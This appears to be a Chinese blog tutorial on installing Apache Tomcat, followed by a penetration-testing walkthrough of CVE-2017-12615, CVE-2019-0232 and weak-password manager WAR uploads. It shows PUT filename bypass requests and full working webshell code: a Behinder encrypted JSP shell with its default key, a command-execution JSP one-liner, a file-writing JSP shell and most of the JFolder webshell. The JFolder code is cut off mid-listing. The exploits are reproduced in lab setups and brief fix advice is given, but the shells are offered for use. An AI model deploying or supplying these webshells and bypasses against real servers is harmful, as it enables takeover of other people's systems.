## Tomcat简介

Tomcat服务器是一个免费的开放源代码的Web应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache服务器的扩展，但运行时它是独立运行的，所以当运行tomcat时，它实际作为一个与Apache独立的进程单独运行的。

目前版本型号 7 ~ 10 版本

默认端口： 8080

## Tomcat安装

**安装下载**

下载地址：

[https://tomcat.apache.org/download-80.cgi](https://tomcat.apache.org/download-80.cgi)

所有版本下载地址：

[https://archive.apache.org/dist/tomcat/tomcat-8/](https://archive.apache.org/dist/tomcat/tomcat-8/)

Tomcat8官网下载链接，在打开页面中选择Core中的第一项zip（pgp，sha512）这是免安装通用格式的，下载后在自己保存的软件目录下解压即可

![1](_v_images/244023709228157.jpeg)

注意：Tomcat的版本对于Java版本以及相应的JSP和Serviet都是有要求的，Tomcat8版本以上的是需要Java7以及以后的版本，所以需要对应JDK的版本来下载Tomcat的版本

安装JDK8

![2](_v_images/241973709237521.jpeg)

**Tomcat的目录结构**

1.  1.  bin目录：存放一些二进制的文件，例如Tomcat常用的启动脚本：startup.bat或startup.sh 关闭脚本：shutdown.bat或shutdown.sh 等等
        
    2.  conf目录：存放的是Tomcat的配置文件，例如最常用的 server.xml 如果需要修改Tomcat的默认端口（默认端口是8080，可以改为其它的端口）就在这里修改
        
    3.  lib目录：存放的是全局的jar包
        
    4.  logs目录：存放的是Tomcat的日志，如果Tomcat出错什么的，就需要在这里的日志中找问题
        
    5.  temp目录：存放的是临时性的文件
        
    6.  webapps目录：存放的是Java的Web项目，要部署的项目就需要放在这个目录中
        
    7.  work目录：存放的是由JSP翻译的Java代码，以及编译的 .class 文件
        

**exe安装**

在官网处下载：

![3](_v_images/239923709225144.jpeg)

![4](_v_images/237873709218589.jpeg)

完成后开始安装

![5](_v_images/235833709216179.jpeg)

点开Tomcat，选中Service，以后可以在管理的服务中启动和关闭Tomcat（也可以默认）

![6](_v_images/233793709223053.jpeg)

点击next

出现管理提示框，要求输入端口和管理密码，保持默认设置就行。默认的端口号就是8080，这里一般不用设置

![7](_v_images/231723709229969.jpeg)

点击next出现下图，它会自动找到JRE位置，如果用户没有安装JRE，可以修改指向JDK目录（很多用户安装后无法编译JSP，就是这里没找到JRE，请务必先要安装JDK，并把这个目录正确指向JRE或者JDK的目录）

![8](_v_images/229693709231167.jpeg)

点击next，之后会出现Tomcat安装路径选择，一般默认安装到C盘，可以直接把C改成D，没有的文件夹会自动创建。修改完毕后点击Install

![9](_v_images/227633709235297.jpeg)

安装完毕点击finish

![10](_v_images/225593709223836.jpeg)

打开浏览器 键入 [http://loaclhost:8080](http://loaclhost:8080/)进入如下页面

![11](_v_images/223533709230842.jpeg)

安装成功

打开安装目录下的bin目录：

其中框中的两项都可以启动Tomcat服务

![12](_v_images/220493709214761.jpeg)

**zip版安装（免安装版）**

直接解压缩，找到bin目录下的startup.bat，启动Tomcat；shutdown.bat：关闭Tomcat

![13](_v_images/218453709235606.jpeg)

Tomcat配置

配置Tomcat之前要保证jdk已经配置完成

![14](_v_images/215403709242314.jpeg)

右键，我的电脑-属性-高级系统设置-打开环境变量的配置窗口，在系统环境变量一栏点击新建。变量名为TOMCAT\_HOME，变量值为Tomcat安装目录

同样在系统变量里新建：

CATALINA\_HOME 和 CATALINA\_BASE

变量值均为安装目录

点击确定后在classpath中加入

%ACTALINA\_HOME%\\common\\lib\\servlet-api.jar;

相对于exe版本来说比较复杂，所以建议直接安装exe版本

## Tomcat渗透

### Tomcat漏洞本质

里面一些重要的文件，需要了解其作用：

1.  server.xml：配置tomcat启动的端口号、host主机、Context等
    
2.  web.xml文件：部署描述文件，这个web.xml中描述了一些默认的servlet，部署每个webapp时，都会调用这个文件，配置该web应用的默认servlet
    
3.  tomcat-users.xml：tomcat的用户密码与权限
    

### Tomcat 任意文件写入（CVE-2017-12615）

影响范围：Apache Tomcat 7.0.0 - 7.0.81（默认配置）

复现环境：使用 kali + docker 进行复现

docker-compose up -d

docker-compose build

docker ps

docker exec -ti 2 bash

cat conf/web.xml | grep readonly

![15](_v_images/213353709226219.jpeg)

![16](_v_images/210303709226563.jpeg)

![17](_v_images/208253709235583.jpeg)

漏洞原理：漏洞的产生是由于配置不当（非默认配置），将配置文件（conf/web.xml）这家拍卖行的readonly设置为了false，导致可以使用的PUT方法上传任意文件，但限制了jsp后缀，不过对于不同平台有多种绕过方法

1）vulhub复现

刷新请求，抓包

![18](_v_images/206213709217942.jpeg)

修改请求方式为put，并写入上传文件内容如下

![19](_v_images/204173709227103.jpeg)

放包，在repeater中查看返回包

![20](_v_images/201073709235018.jpeg)

上传成功

![21](_v_images/198993709238659.jpeg)

2）本地环境复现：

首先打开conf/web.xml

添加下述代码

![22](_v_images/196893709233861.jpeg)

<init-param>  
​  
<param-name>readonly</param-name>  
​  
<param-value>false</param-value>  
​  
</init-param>

保存后重启tomcat，访问8080端口，并抓包，修改请求方式，如下：

![23](_v_images/194853709230477.jpeg)

![24](_v_images/192813709220155.jpeg)

成功

尝试上传jsp文件

![25](_v_images/190763709220253.jpeg)

但是直接上传jsp文件是不允许的

3）绕过上传jsp

对于这种情况来说，有很多种方式可以绕过

*   windows下不允许文件以空格结尾
    

以

PUT /YLion1.jsp%20 HTTP/1.1

上传到windows会被自动去掉末尾空格

*   windowsNTFS流
    

PUT /YLion2.jsp::$DATA HTTP/1.1

*   /在文件名中是非法的，也会被去除（Linux/Windows）
    

PUT /YLion3.jsp/ HTTP/1.1

![26](_v_images/188693709241319.jpeg)

![27](_v_images/186653709211501.jpeg)

![28](_v_images/184613709213055.jpeg)

三种方法在vulhub上都绕过了

4）上传jsp一句话

下载并打开冰蝎jsp

![29](_v_images/182573709233403.jpeg)

![30](_v_images/180503709214248.jpeg)

![31](_v_images/178453709223529.jpeg)

<%@page import="java.util.\*,javax.crypto.\*,javax.crypto.spec.\*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte \[\]b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>

该密钥为连接密码32位md5值的前16位，默认连接密码位 rebeyond

上传冰蝎成功

![32](_v_images/176383709211991.jpeg)

成功控制对方系统权限

或者

CMD一句话：

<%@ page import="java.util.\*,java.io.\*"%>  
<%  
if (request.getParameter("cmd") != null) {  
out.println("Command: " + request.getParameter("cmd") + "<BR>");  
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));  
OutputStream os = p.getOutputStream();  
InputStream in = p.getInputStream();  
DataInputStream dis = new DataInputStream(in);  
String disr = dis.readLine();  
while ( disr != null ) {  
out.println(disr);   
disr = dis.readLine();   
}  
}  
%>

![33](_v_images/173343709238742.jpeg)

[http://192.168.253.7:8080/7.jsp?cmd=id](http://192.168.253.7:8080/7.jsp?cmd=id)

![34](_v_images/171293709220954.jpeg)

5）kali安装tomcat复现

目前本地无法上传jsp，应该是绕过windows限制问题，转换到kali上操作

![35](_v_images/169263709219936.jpeg)

proxychains wget [https://mirror.nodesdirect.com/apache/tomcat/tomcat-8/v8.5.65/bin/apache-omcat-8.5.65.tar.gz](https://mirror.nodesdirect.com/apache/tomcat/tomcat-8/v8.5.65/bin/apache-omcat-8.5.65.tar.gz)

解压文件

tar zxvf apache-tomcat-8.5.65.tar.gz.1

mv apache-tomcat-8.5.65 tomcat

![36](_v_images/167223709224072.jpeg)

编辑就配置文件 etc/profile

cd /etc

vi profile

export CATALINA\_HOME=/root/Desktop/tomcat

![37](_v_images/164183709231250.jpeg)

重启环境变量：

source /etc/profile

![38](_v_images/161133709243970.jpeg)

启动Tomcat服务

./startup.sh

关闭Tomcat服务

./shutdown.sh

![39](_v_images/158063709243875.jpeg)

![40](_v_images/156003709238857.jpeg)

将vulhub文件拷出检查

sudo docker ps  
​  
sudo docker cp 282510c8bb43:/usr/local/tomcat/conf/web.xml /home/dayu/Desktop/  
  
<init-param><param-name>readonly</param-name><param-value>false</param-value></init-param>

修改完要重新启动

通过空格方式绕过

![41](_v_images/153933709236760.jpeg)

6）修复建议

将readonly=true，默认为true

### Tomcat远程代码执行（CVE-2019-0232）

1）漏洞简介

影响范围：

Apache Tomcat 9.0.0.M1 to 9.0.17

Apache Tomcat 8.5.0 to 8.5.39

Apache Tomcat 7.0.0 to 7.0.93

影响系统：Windows

复现环境：9.0.17

Tomcat的CGI\_Servlet组件默认是关闭的，在conf/web.xml 中找到注释的CGIServlet部分，去掉注释，并配置enableCmdLineArguments和executable，

2）漏洞底层环境复现详解

首先进行CGI相关的配置，在conf/web.xml启用CGIServlet：

![42](_v_images/151883709218081.jpeg)

<servlet>  
<servlet-name>cgi</servlet-name>  
<servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>  
<init-param>  
<param-name>cgiPathPrefix</param-name>  
<param-value>WEB-INF/cgi-bin</param-value>  
</init-param>  
<init-param>  
<param-name>enableCmdLineArguments</param-name>  
<param-value>true</param-value>  
</init-param>  
<init-param>  
<param-name>executable</param-name>  
<param-value></param-value>  
</init-param>  
<load-on-startup>5</load-on-startup>  
</servlet>

这里主要的设置是 enableCmdLineArguments 和 executable 两个选项

1.  enableCmdLineArguments 启用后才会将url中的参数传递到命令行
    
2.  executable 指定了执行的二进制文件，默认是perl，需要置为空才会执行文件本身
    

同样在 conf/web.xml 中启用cgi的servlet-mapping：

![43](_v_images/149843709239466.jpeg)

最后修改conf/context.xml 的，添加pricileged="true"属性，否则会设有权限

<Context privileged="true">

![44](_v_images/147813709218924.jpeg)

配置目录文件：

然后在C:\\tommcat\\webapps\\ROOT\\WEB-INF下创建cgi-bin目录，并在该目录下创建一个dayu.bat的文件填写任意内容即可

![45](_v_images/145763709226354.jpeg)

[http://127.0.0.1:8080/cgi-bin/dayu1.bat?&dir](http://127.0.0.1:8080/cgi-bin/dayu1.bat?&dir)

可看到成功任意代码执行

3）漏洞原理-java代码审计

漏洞相关的代码在 tomcat\\java\\org\\apache\\catalina\\servlets\\CGIServlet.java 中，CGIServlet提供了一个cgi的调用接口，在启用enableCmdLineArguments 参数时，会根据RFC 3875 来从Url参数中生成命令行参数，并把参数传递至Java的Runtime执行。这个漏洞时因为Runtime.getRuntime().exec 在windows和linux中底层实现不同导致的

下面以一个简单的case来说明这个问题，在windows下创建Ylion.bat：

rm Ylion.bat  
  
echo %\*

并执行下面的Java代码：

String \[\] cmd={"dayu.bat", "dayu", "&", "dir"};  
  
Runtime.getRuntime().exec(cmd);

再windows下会输出arg和dir命令运行后的结果。同样的，用类似的脚本在Linux环境下测试：

\\# dayu.sh  
  
for key in "$@"  
  
do  
  
echo '$@' $key  
  
done  
  
  
  
String \[\] cmd={"dayu.sh", "dayu", "&", "dir"};  
  
Runtime.getRuntime().exec(cmd);

此时的输出为：

$@ dayu  
  
$@ &  
  
$@ dir

导致这种输出的原因是在JDK的实现中 Runtime.getRuntime().exec 实际调用了ProcessBuilder ，然后ProcessBuilder 调用 ProcessImpl 使用系统调用 vfork，把所有参数直接传递至 execve

用 strace -F -e vfork,execve java Main 跟踪可以看到上面的Java代码在Linux中调用为：

execve("dayu.sh",\["dayu.sh","dayu","&","dir"\],\[/23 vars/\])

而如果跟踪类似的PHP代码 system('a.sh dayu & dir'); ，得到的结果为：

execve("/bin/sh", \["sh", "-c", "a.sh dayu & dir"\], \[/\* 23 vars \*/\])

所以Java的 Runtime.getRuntime().exec 在CGI调用这种情况下很难有命令注入。在windows中创建进程使用的是CreateProcess，会将参数合并成字符串，作为 lpComandLine 传入 CreateProcess。程序启动后调用GetCommandLine 获取参数，并调用 CommandLineToArgvW 传至 argv。在windows中，当 CreatePeocess 中的参数为 bat 文件，或是cmd文件时，会调用cmd.exe，故最后会变成 cmd.exe /c "dayu.bat & dir" ，而Java调用中没有做任何的转义，所以在windows下回存在此漏洞

除此之外，windows在处理参数方面还有一个特性，如果这里只加上简单的转义还是可能被绕过，例如：

dir ""&whoami" 在linux中是安全的，在windows中会执行命令

这是因为Windows在处理命令行参数时，会将 " 中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个 " ，但是对于 " 的处理有误。同样用 dayu.bat 做测试，可能发现这里只输出了 \\。因此在Java中调用批处理或者cmd文件时，需要做合适的参数检查才能避免出现漏洞

修复方式：

开发者在 patch 中增加了 cmdLineArgmentsDecoded 参数，这个参数用来校验传入的命令行参数，如果传入的命令行参数不符合规定的模式，则不执行。校验写在 setupFromRequest 函数中：

String decodedArgument = URLDecoder.decode(encodedArgument, parameterEncoding);  
if (cmdLineArgumentsDecodedPattern != null &&  
!cmdLineArgumentsDecodedPattern.matcher(decodedArgument).matches()) {  
if (log.isDebugEnabled()) {  
log.debug(sm.getString("cgiServlet.invalidArgumentDecoded",  
decodedArgument, cmdLineArgumentsDecodedPattern.toString()));  
}  
return false;  
}

不通过时，会将 CGIEnvironment 的vaild 参数设为 false，在之后的处理函数中会直接跳过执行

if (cgiEnv.isValid()) {  
CGIRunner cgi = new CGIRunner(cgiEnv.getCommand(),  
cgiEnv.getEnvironment(),  
cgiEnv.getWorkingDirectory(),  
cgiEnv.getParameters());  
if ("POST".equals(req.getMethod())) {  
cgi.setInput(req.getInputStream());  
}  
cgi.setResponse(res);  
cgi.run();  
} else {  
res.sendError(404);  
}

修复建议：

1.使用更新版本的Apache Tomcat。这里需要注意的是，虽然在9.0.18就修复了这个漏洞，但这个更新是并没有通过候选版本的投票，虽然9.0.18没有在被影响的列表中，但是用户仍然需要下载9.0.19的版本来获得没有该漏洞的版本

2.关闭enableCmdLineArguments参数

### Tomcat 弱口令 && 后台 getshell 漏洞

1）漏洞简介

影响范围：Tomcat8，但是经过测试，全版本影响

测试环境：Tomcat 9.0.17

2）查看源代码

![46](_v_images/143693709215877.jpeg)

sudo docker ps  
sudo docker exec -ti a bash  
cd conf  
sudo docker cp aaf15dc1493c:/usr/local/tomcat/conf/tomcat-users.xml /home/dayu/Desktop/  
sudo docker cp aaf15dc1493c:/usr/local/tomcat/conf/tomcat-users.xsd /home/dayu/Desktop/  
sudo docker cp aaf15dc1493c:/usr/local/tomcat/conf/web.xml /home/dayu/Desktop/

![47](_v_images/141653709228886.jpeg)

源码拷贝出来：

如下：

<?xml version="1.0" encoding="UTF-8"?>  
<tomcat-users xmlns="http://tomcat.apache.org/xml"  
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"  
version="1.0">  
<role rolename="manager-gui"/>  
<role rolename="manager-script"/>  
<role rolename="manager-jmx"/>  
<role rolename="manager-status"/>  
<role rolename="admin-gui"/>  
<role rolename="admin-script"/>  
<user username="tomcat" password="tomcat" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />  
  
</tomcat-users>

源码解释： manager（后台管理）：

manager-gui 拥有 html 页面权限

manager-status 拥有查看 status 的权限

manager-script 拥有 text 接口的权限，和 status 权限

manager-jmx 拥有 jmx 权限和 status 权限

host-manager（虚拟主机管理）：

admin-gui 拥有 html 页面权限

admin-script 拥有 text 接口权限

3）本地源码搭建

在conf/tomcat-users.xml文件中配置用户的权限：

![48](_v_images/139613709241546.jpeg)

![49](_v_images/137573709242535.jpeg)

全部代码修改为此情况

改 C:\\tomcat9\\conf\\Catalina\\localhost 路径下的 manager.xml 文件，如果该路径下面没有此文件，可以新建一个，内容为：

<Context privileged="true" antiResourceLocking="false"   
docBase="${catalina.home}/webapps/manager">  
<Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="^.\*$" />   
</Context>

![50](_v_images/135533709235024.jpeg)

成功创建和添加以上内容，允许远程访问该manager

登录manager页面：

![51](_v_images/133493709239916.jpeg)

![52](_v_images/131463709221107.jpeg)

正常访问，密码搭建写入的密码为tomcat/tomcat

成功登录

4）本地getshell复现

（1）简介：

正常安装情况下，tomcat版本中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击

![53](_v_images/129423709228248.jpeg)

（2）文件上传war包简介

为什么上传war包：

war包是用来进行Web开发时一个网站项目下的所有代码，包括前台HTML/CSS/JS代码，以及后台JavaWeb的代码。当开发人员开发完毕时，就会将源码打包给测试人员测试，测试完后若要发布则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录，当Tomcat服务器启动时，war包即会随之解压源代码来进行自动部署

（3）生成war大马包

JSP大马：

<%@page contentType="text/html;charset=gb2312"%>      
<%@page import="java.io.\*,java.util.\*,java.net.\*"%>      
<html>      
<head>      
<title></title>      
<style type="text/css">      
body { color:red; font-size:12px; background-color:white; }      
</style>      
</head>      
<body>      
<%      
if(request.getParameter("context")!=null)      
{      
String context=new String(request.getParameter("context").getBytes("ISO-8859-1"),"gb2312");      
String path=new String(request.getParameter("path").getBytes("ISO-8859-1"),"gb2312");      
OutputStream pt = null;      
try {      
pt = new FileOutputStream(path);      
pt.write(context.getBytes());      
out.println("<a href='"+request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+request.getRequestURI()+"'><font color='red' title='点击可以转到上传的文件页面!'>上传成功!</font></a>");      
} catch (FileNotFoundException ex2) {      
out.println("<font color='red'>上传失败!</font>");      
} catch (IOException ex) {      
out.println("<font color='red'>上传失败!</font>");      
} finally {      
try {      
pt.close();      
} catch (IOException ex3) {      
out.println("<font color='red'>上传失败!</font>");      
}      
}      
}      
%>      
<form name="frmUpload" method="post" action="">      
<font color="blue">本文件的路径:</font><%out.print(request.getRealPath(request.getServletPath())); %>      
<br>      
<br>      
<font color="blue">上传文件路径:</font><input type="text" size="70" name="path" value="<%out.print(getServletContext().getRealPath("/")); %>">      
<br>      
<br>      
上传文件内容:<textarea name="context" id="context" style="width: 51%; height: 150px;"></textarea>      
<br>      
<br>      
<input type="submit" name="btnSubmit" value="Upload">      
</form>      
</body>      
</html>   

将jasp文件做成war有两种方式

1.将jsp文件压缩为zip，将zip重命名为war

2.使用java命令（tomcat需要Java环境，所以环境系统自带java命令环境执行）

jar -cvf 123.war 123.jsp

（4）上传war木马

![54](_v_images/127343709237512.jpeg)

![55](_v_images/125303709236880.jpeg)

成功上传点击部署后跳转OK界面

查看上传位置：

![56](_v_images/123263709231125.jpeg)

获得上传位置，检查本地发现确实存在

![57](_v_images/121223709213082.jpeg)

（5）大马检测

成功解析jsp大马，并能upload上传功能

![58](_v_images/117773709222751.jpeg)

上传冰蝎的jsp马

<%@page import="java.util.\*,javax.crypto.\*,javax.crypto.spec.\*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte \[\]b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>  
  
/\*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\*/

![59](_v_images/115703709225984.jpeg)

![60](_v_images/113663709232939.jpeg)

再提供一个牛逼的JSP大马

<%  
/\*\*  
JFolder V0.9  windows platform  
@Filename： JFolder.jsp   
@Description： 一个简单的系统文件目录显示程序，类似于资源管理器，提供基本的文件操作，不过功能较弱。  
@Bugs  :  下载时，中文文件名无法正常显示  
\*/  
%>  
<%@ page contentType="text/html;charset=gb2312"%>  
<%@page import="java.io.\*,java.util.\*,java.net.\*" %>  
<%!  
private final static int languageNo=0; //语言版本，0 : 中文； 1：英文  
String strThisFile="JFolder.jsp";  
String\[\] authorInfo={" <font color=red> 岁月联盟-专用版 </font>"," <font color=red> Thanks for your support - - by Steven Cee http:// </font>"};  
String\[\] strFileManage   = {"文 件 管 理","File Management"};  
String\[\] strCommand      = {"CMD 命 令","Command Window"};  
String\[\] strSysProperty  = {"系 统 属 性","System Property"};  
String\[\] strHelp         = {"帮 助","Help"};  
String\[\] strParentFolder = {"上级目录","Parent Folder"};  
String\[\] strCurrentFolder= {"当前目录","Current Folder"};  
String\[\] strDrivers      = {"驱动器","Drivers"};  
String\[\] strFileName     = {"文件名称","File Name"};  
String\[\] strFileSize     = {"文件大小","File Size"};  
String\[\] strLastModified = {"最后修改","Last Modified"};  
String\[\] strFileOperation= {"文件操作","Operations"};  
String\[\] strFileEdit     = {"修改","Edit"};  
String\[\] strFileDown     = {"下载","Download"};  
String\[\] strFileCopy     = {"复制","Move"};  
String\[\] strFileDel      = {"删除","Delete"};  
String\[\] strExecute      = {"执行","Execute"};  
String\[\] strBack         = {"返回","Back"};  
String\[\] strFileSave     = {"保存","Save"};  
public class FileHandler  
{  
private String strAction="";  
private String strFile="";  
void FileHandler(String action,String f)  
{  
  
}  
}  
public static class UploadMonitor {  
static Hashtable uploadTable = new Hashtable();  
static void set(String fName, UplInfo info) {  
uploadTable.put(fName, info);  
}  
static void remove(String fName) {  
uploadTable.remove(fName);  
}  
static UplInfo getInfo(String fName) {  
UplInfo info = (UplInfo) uploadTable.get(fName);  
return info;  
}  
}  
public class UplInfo {  
public long totalSize;  
public long currSize;  
public long starttime;  
public boolean aborted;  
public UplInfo() {  
totalSize = 0l;  
currSize = 0l;  
starttime = System.currentTimeMillis();  
aborted = false;  
}  
public UplInfo(int size) {  
totalSize = size;  
currSize = 0;  
starttime = System.currentTimeMillis();  
aborted = false;  
}  
public String getUprate() {  
long time = System.currentTimeMillis() - starttime;  
if (time != 0) {  
long uprate = currSize \* 1000 / time;  
return convertFileSize(uprate) + "/s";  
}  
else return "n/a";  
}  
public int getPercent() {  
if (totalSize == 0) return 0;  
else return (int) (currSize \* 100 / totalSize);  
}  
public String getTimeElapsed() {  
long time = (System.currentTimeMillis() - starttime) / 1000l;  
if (time - 60l >= 0){  
if (time % 60 >=10) return time / 60 + ":" + (time % 60) + "m";  
else return time / 60 + ":0" + (time % 60) + "m";  
}  
else return time<10 ? "0" + time + "s": time + "s";  
}  
public String getTimeEstimated() {  
if (currSize == 0) return "n/a";  
long time = System.currentTimeMillis() - starttime;  
time = totalSize \* time / currSize;  
time /= 1000l;  
if (time - 60l >= 0){  
if (time % 60 >=10) return time / 60 + ":" + (time % 60) + "m";  
else return time / 60 + ":0" + (time % 60) + "m";  
}  
else return time<10 ? "0" + time + "s": time + "s";  
}  
}  
public class FileInfo {  
public String name = null, clientFileName = null, fileContentType = null;  
private byte\[\] fileContents = null;  
public File file = null;  
public StringBuffer sb = new StringBuffer(100);  
public void setFileContents(byte\[\] aByteArray) {  
fileContents = new byte\[aByteArray.length\];  
System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);  
}  
}  
// A Class with methods used to process a ServletInputStream  
public class HttpMultiPartParser {  
private final String lineSeparator = System.getProperty("line.separator", "\\n");  
private final int ONE\_MB = 1024 \* 1;  
public Hashtable processData(ServletInputStream is, String boundary, String saveInDir,  
int clength) throws IllegalArgumentException, IOException {  
if (is == null) throw new IllegalArgumentException("InputStream");  
if (boundary == null || boundary.trim().length() < 1) throw new IllegalArgumentException(  
"\\"" + boundary + "\\" is an illegal boundary indicator");  
boundary = "--" + boundary;  
StringTokenizer stLine = null, stFields = null;  
FileInfo fileInfo = null;  
Hashtable dataTable = new Hashtable(5);  
String line = null, field = null, paramName = null;  
boolean saveFiles = (saveInDir != null && saveInDir.trim().length() > 0);  
boolean isFile = false;  
if (saveFiles) { // Create the required directory (including parent dirs)  
File f = new File(saveInDir);  
f.mkdirs();  
}  
line = getLine(is);  
if (line == null || !line.startsWith(boundary)) throw new IOException(  
"Boundary not found; boundary = " + boundary + ", line = " + line);  
while (line != null) {  
if (line == null || !line.startsWith(boundary)) return dataTable;  
line = getLine(is);  
if (line == null) return dataTable;  
stLine = new StringTokenizer(line, ";\\r\\n");  
if (stLine.countTokens() < 2) throw new IllegalArgumentException(  
"Bad data in second line");  
line = stLine.nextToken().toLowerCase();  
if (line.indexOf("form-data") < 0) throw new IllegalArgumentException(  
"Bad data in second line");  
stFields = new StringTokenizer(stLine.nextToken(), "=\\"");  
if (stFields.countTokens() < 2) throw new IllegalArgumentException(  
"Bad data in second line");  
fileInfo = new FileInfo();  
stFields.nextToken();  
paramName = stFields.nextToken();  
isFile = false;  
if (stLine.hasMoreTokens()) {  
field = stLine.nextToken();  
stFields = new StringTokenizer(field, "=\\"");  
if (stFields.countTokens() > 1) {  
if (stFields.nextToken().trim().equalsIgnoreCase("filename")) {  
fileInfo.name = paramName;  
String value = stFields.nextToken();  
if (value != null && value.trim().length() > 0) {  
fileInfo.clientFileName = value;  
isFile = true;  
}  
else {  
line = getLine(is); // Skip "Content-Type:" line  
line = getLine(is); // Skip blank line  
line = getLine(is); // Skip blank line  
line = getLine(is); // Position to boundary line  
continue;  
}  
}  
}  
else if (field.toLowerCase().indexOf("filename") >= 0) {  
line = getLine(is); // Skip "Content-Type:" line  
line = getLine(is); // Skip blank line  
line = getLine(is); // Skip blank line  
line = getLine(is); // Position to boundary line  
continue;  
}  
}  
boolean skipBlankLine = true;  
if (isFile) {  
line = getLine(is);  
if (line == null) return dataTable;  
if (line.trim().length() < 1) skipBlankLine = false;  
else {  
stLine = new StringTokenizer(line, ": ");  
if (stLine.countTokens() < 2) throw new IllegalArgumentException(  
"Bad data in third line");  
stLine.nextToken(); // Content-Type  
fileInfo.fileContentType = stLine.nextToken();  
}  
}  
if (skipBlankLine) {  
line = getLine(is);  
if (line == null) return dataTable;  
}  
if (!isFile) {  
line = getLine(is);  
if (line == null) return dataTable;  
dataTable.put(paramName, line);  
// If parameter is dir, change saveInDir to dir  
if (paramName.equals("dir")) saveInDir = line;  
line = getLine(is);  
continue;  
}  
try {  
UplInfo uplInfo = new UplInfo(clength);  
UploadMonitor.set(fileInfo.clientFileName, uplInfo);  
OutputStream os = null;  
String path = null;  
if (saveFiles) os = new FileOutputStream(path = getFileName(saveInDir,  
fileInfo.clientFileName));  
else os = new ByteArrayOutputStream(ONE\_MB);  
boolean readingContent = true;  
byte previousLine\[\] = new byte\[2 \* ONE\_MB\];  
byte temp\[\] = null;  
byte currentLine\[\] = new byte\[2 \* ONE\_MB\];  
int read, read3;  
if ((read = is.readLine(previousLine, 0, previousLine.length)) == -1) {  
line = null;  
break;  
}  
while (readingContent) {  
if ((read3 = is.readLine(currentLine, 0, currentLine.length)) == -1) {  
line = null;  
uplInfo.aborted = true;  
break;  
}  
if (compareBoundary(boundary, currentLine)) {  
os.write(previousLine, 0, read - 2);  
line = new String(currentLine, 0, read3);  
break;  
}  
else {  
os.write(previousLine, 0, read);  
uplInfo.currSize += read;  
temp = currentLine;  
currentLine = previousLine;  
previousLine = temp;  
read = read3;  
}//end else  
}//end while  
os.flush();  
os.close();  
if (!saveFiles) {  
ByteArrayOutputStream baos = (ByteArrayOutputStream) os;  
fileInfo.setFileContents(baos.toByteArray());  
}  
else fileInfo.file = new File(path);  
dataTable.put(paramName, fileInfo);  
uplInfo.currSize = uplInfo.totalSize;  
}//end try  
catch (IOException e) {  
throw e;  
}  
}  
return dataTable;  
}  
/\*\*  
\* Compares boundary string to byte array  
\*/  
private boolean compareBoundary(String boundary, byte ba\[\]) {  
byte b;  
if (boundary == null || ba == null) return false;  
for (int i = 0; i < boundary.length(); i++)  
if ((byte) boundary.charAt(i) != ba\[i\]) return false;  
return true;  
}  
/\*\* Convenience method to read HTTP header lines \*/  
private synchronized String getLine(ServletInputStream sis) throws IOException {  
byte b\[\] = new byte\[1024\];  
int read = sis.readLine(b, 0, b.length), index;  
String line = null;  
if (read != -1) {  
line = new String(b, 0, read);  
if ((index = line.indexOf('\\n')) >= 0) line = line.substring(0, index - 1);  
}  
return line;  
}  
public String getFileName(String dir, String fileName) throws IllegalArgumentException {  
String path = null;  
if (dir == null || fileName == null) throw new IllegalArgumentException(  
"dir or fileName is null");  
int index = fileName.lastIndexOf('/');  
String name = null;  
if (index >= 0) name = fileName.substring(index + 1);  
else name = fileName;  
index = name.lastIndexOf('\\\\');  
if (index >= 0) fileName = name.substring(index + 1);  
path = dir + File.separator + fileName;  
if (File.separatorChar == '/') return path.replace('\\\\', File.separatorChar);  
else return path.replace('/', File.separatorChar);  
}  
} //End of class HttpMultiPartParser  
String formatPath(String p)  
{  
StringBuffer sb=new StringBuffer();  
for (int i = 0; i < p.length(); i++)   
{  
if(p.charAt(i)=='\\\\')  
{  
sb.append("\\\\\\\\");  
}  
else  
{  
sb.append(p.charAt(i));  
}  
}  
return sb.toString();  
}  
/\*\*  
\* Converts some important chars (int) to the corresponding html string  
\*/  
static String conv2Html(int i) {  
if (i == '&') return "&amp;";  
else if (i == '<') return "&lt;";  
else if (i == '>') return "&gt;";  
else if (i == '"') return "&quot;";  
else return "" + (char) i;  
}  
/\*\*  
\* Converts a normal string to a html conform string  
\*/  
static String htmlEncode(String st) {  
StringBuffer buf = new StringBuffer();  
for (int i = 0; i < st.length(); i++) {  
buf.append(conv2Html(st.charAt(i)));  
}  
return buf.toString();  
}  
String getDrivers()  
/\*\*  
Windows系统上取得可用的所有逻辑盘  
\*/  
{  
StringBuffer sb=new StringBuffer(strDrivers\[languageNo\] + " : ");  
File roots\[\]=File.listRoots();  
for(int i=0;i<roots.length;i++)  
{  
sb.append(" <a href=\\"javascript:doForm('','"+roots\[i\]+"\\\\','','','1','');\\">");  
sb.append(roots\[i\]+"</a>&nbsp;");  
}  
return sb.toString();  
}  
